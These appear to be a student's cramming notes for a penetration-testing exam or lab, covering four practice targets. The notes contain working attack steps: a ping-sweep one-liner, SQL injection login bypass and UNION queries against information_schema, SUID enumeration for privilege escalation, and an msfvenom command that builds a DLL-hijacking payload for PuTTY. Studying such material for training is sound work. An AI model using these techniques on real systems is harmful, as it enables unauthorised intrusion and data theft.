read the mission plan.


```
target 1
```
take note of shell in /etc/passwd
```
ping sweep | proxychains if ping disabled , look at ttl
for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
```

admin login, go to network tab
it will give post login.php
type what it says into the search bar, go back to network and go to request tab
its literally a .php api request
login.php?username=bob OR 1='1...

```
number of questions per on the exam:

postex: 11 **
winex: 5
recon: 4
sql: 4 **
linex: 4
binary: 4
exdev: 3
webex: 1

**new one**
postex 11 **
winex 6
recon 4
sql 4 **
linex 4
binary 4
exdev 4
```
post ex, look in tmp /var/tmp /home/ , process list /etc/rsyslog* , 
'uname -a 4.15.0.213-generic'

ls /var/www/html
if in green. its a dir.

```
login.php has credentials to webuser,sqlpass
mysql --user=webuser --pass=sqlpass

show tables
select * from session_log;
select * from user;

exit
```
make your tunnel to it so you can jump to next box

if op plans say nothing about getting into the box, do not get into the box.

```
target 2
```
sql...

```
1=1 - > find vuln
UNION SELECT 1,2,3 - > find columns
// out put is 1,3,2
UNION SELECT table_name,column_name,table_schema from information_schema.columns - > golden rule
// information_schema is the database
you can change golden rule to read left to right with the output
// table_schema,column_name,table_name
Information_schema, MySQL, Performance_schema - > 3 default db but you do not have to query them outside of the golden rule !!!!
- > find user created db | also do not trip on product=7/the first line. ignore this along with the default db. !!!!
//example from dry run below.
UNION SELECT user_id,name,username from siteusers.users
```

cleaned up
```
1=1
UNION SELECT 1,2,3
// out put is 1,3,2
UNION SELECT table_name,column_name,table_schema from information_schema.columns
// find user created db & query
UNION SELECT user_id,name,username from siteusers.users

```
```
target 3
```

```
round sensor
forward to it

when you login dont forget to type `bash` to get a borne again shell
cat /etc/crontab
find / -type f -perm /6000 -ls 2>/dev/null
look at whos running and it what the source location is
go to gtfobins
get your shell for find


once we're root, ls /root/ .. enum
in ghidra >> does not mean append, it means bit shift
bit shift calculator on google
.. when decompiling you go to the left not the right


now lets ping sweep
```

```
target 4 
```

windows
```

putty is running

procmon , run putty
setup filters

process name , contains , putty.exe
path , contains , .dll
result , is , NAME NOT FOUND

this will help us find the .dll its looking for

msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll

scp it to windows or `windows scp from linux`
scp src .

put .dll in putty dir
then run putty


```
